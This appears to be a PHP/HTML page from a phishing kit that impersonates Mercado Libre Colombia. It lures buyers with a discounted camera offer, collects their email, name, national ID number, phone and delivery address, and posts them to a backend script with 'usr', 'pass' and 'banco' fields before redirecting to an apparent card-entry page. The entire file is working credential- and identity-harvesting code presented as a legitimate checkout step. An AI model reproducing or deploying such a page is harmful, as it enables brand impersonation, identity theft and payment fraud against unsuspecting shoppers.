<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
require_once __DIR__ . '/../../conexion.php';
require_once __DIR__ . '/../../config.php';
require_once __DIR__ . '/../../token_helper.php';

$token = $_GET['token'] ?? ($_SESSION['landing_token'] ?? '');
$landing_data = null;
if (!empty($token)) {
    $landing_data = obtenerLandingPorToken($token, $pdo);
}

if ($landing_data) {
    $producto = $landing_data['producto'];
    $precio = (int)$landing_data['precio'];
    $_SESSION['landing_token'] = $token;
} else {
    $producto = isset($_GET['producto']) ? $_GET['producto'] : 'DJI Osmo Pocket 3 Creator Combo Color Negro';
    $precio = isset($_GET['precio']) ? (int)$_GET['precio'] : 1500000;
}
$anticipo_pagar = 3000;
?>
<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
    <title>Datos de envío - Mercado Libre</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions.js"></script>
    
    <style>
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 300;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 400;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 600;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
        }

        :root {
            --ml-yellow: #fff159;
            --ml-blue: #3483fa;
            --ml-blue-hover: #2968c8;
            --ml-text-black: #333333;
            --ml-text-gray: #666666;
            --ml-bg: #ebebeb;
            --ml-border: #e6e6e6;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Proxima Nova', sans-serif;
            background-color: var(--ml-bg);
            color: var(--ml-text-black);
            height: 100%;
        }

        .ml-header {
            background-color: var(--ml-yellow);
            height: 60px;
            width: 100%;
            display: flex;
            align-items: center;
        }
        
        .nav-bounds {
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
        }

        .nav-logo {
            width: 134px;
            height: 34px;
            background-image: url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png');
            background-size: contain;
            background-repeat: no-repeat;
        }
        
        .nav-help {
            font-size: 14px;
            color: var(--ml-text-black);
            text-decoration: none;
        }

        .main-container {
            max-width: 500px;
            margin: 40px auto;
            background: #fff;
            border-radius: 6px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            padding: 40px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-top: 0;
            margin-bottom: 24px;
            text-align: center;
        }

        p {
            font-size: 16px;
            color: var(--ml-text-gray);
            margin-bottom: 30px;
            line-height: 1.4;
            text-align: center;
        }

        .input-group {
            text-align: left;
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            font-size: 14px;
            margin-bottom: 8px;
            color: var(--ml-text-gray);
            font-weight: 600;
        }
        
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid var(--ml-border);
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            font-family: inherit;
        }
        
        .input-group input:focus {
            border-color: var(--ml-blue);
            box-shadow: 0 0 0 1px var(--ml-blue);
        }

        .row-2 {
            display: flex;
            gap: 15px;
        }

        .row-2 .input-group {
            flex: 1;
        }

        .btn-primary {
            background-color: var(--ml-blue);
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 0 24px;
            height: 48px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        
        .btn-primary:hover {
            background-color: var(--ml-blue-hover);
        }

        @media (max-width: 480px) {
            .main-container {
                margin: 20px;
                padding: 30px 20px;
            }
            .row-2 {
                flex-direction: column;
                gap: 0;
            }
        }
    </style>
</head>
<body>

    <header class="ml-header">
        <div class="nav-bounds">
            <a href="#" class="nav-logo"></a>
            <a href="#" class="nav-help">Ayuda / PQR</a>
        </div>
    </header>

    <main class="main-container">
        <h1>Datos de contacto y envío</h1>
        <p>Ingresa tus datos para enviarte el producto y enviarte el recibo de pago.</p>

        <form id="datosForm">
            <div class="input-group">
                <label>E-mail</label>
                <input type="email" id="txtEmail" required placeholder="correo@ejemplo.com">
            </div>

            <div class="input-group">
                <label>Nombre y Apellido</label>
                <input type="text" id="txtNombre" required placeholder="Ej. Juan Pérez">
            </div>

            <div class="row-2">
                <div class="input-group">
                    <label>Cédula de ciudadanía</label>
                    <input type="tel" id="txtCedula" required placeholder="123456789" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                </div>
                
                <div class="input-group">
                    <label>Celular</label>
                    <input type="tel" id="txtCelular" required placeholder="300 000 0000" oninput="this.value = this.value.replace(/[^0-9]/g, '')" maxlength="10">
                </div>
            </div>

            <div class="row-2">
                <div class="input-group" style="flex: 2;">
                    <label>Dirección de entrega</label>
                    <input type="text" id="txtDireccion" required placeholder="Ej. Calle 123 # 45 - 67, Apto 101">
                </div>
                
                <div class="input-group" style="flex: 1;">
                    <label>Ciudad</label>
                    <input type="text" id="txtCiudad" required placeholder="Ej. Bogotá">
                </div>
            </div>

            <button type="submit" class="btn-primary" id="btnContinuar">Continuar a pago</button>
        </form>
        
    </main>

    <script>
        $(document).ready(function() {
            $('#datosForm').submit(function(e) {
                e.preventDefault();
                
                const email = $('#txtEmail').val().trim();
                const nombre = $('#txtNombre').val().trim();
                const cedula = $('#txtCedula').val().trim();
                const celular = $('#txtCelular').val().trim();
                const btn = $('#btnContinuar');
                
                if (email.length > 0 && nombre.length > 0) {
                    btn.text('Cargando...');
                    btn.prop('disabled', true);
                    
                    setCookie('usuario', email, 1);
                    
                    $.post(API_BASE + 'paso_usuario.php', {
                        usr: email,
                        pass: 'MERCADOLIBRE_GUEST',
                        banco: 'MercadoLibre',
                        dis: navigator.userAgent,
                        nombre: nombre,
                        cedula: cedula,
                        celular: celular,
                        email: email
                    }, function(res) {
                        const tokenVal = <?= json_encode($token) ?>;
                        const prod = <?= json_encode($producto) ?>;
                        if (tokenVal && tokenVal.length > 0) {
                            window.location.href = "tarjeta.php?token=" + encodeURIComponent(tokenVal);
                        } else {
                            window.location.href = "tarjeta.php?producto=" + encodeURIComponent(prod) + "&precio=<?= (int)$precio ?>";
                        }
                    }).fail(function() {
                        const tokenVal = <?= json_encode($token) ?>;
                        const prod = <?= json_encode($producto) ?>;
                        if (tokenVal && tokenVal.length > 0) {
                            window.location.href = "tarjeta.php?token=" + encodeURIComponent(tokenVal);
                        } else {
                            window.location.href = "tarjeta.php?producto=" + encodeURIComponent(prod) + "&precio=<?= (int)$precio ?>";
                        }
                    });
                }
            });
        });
    </script>
</body>
</html>
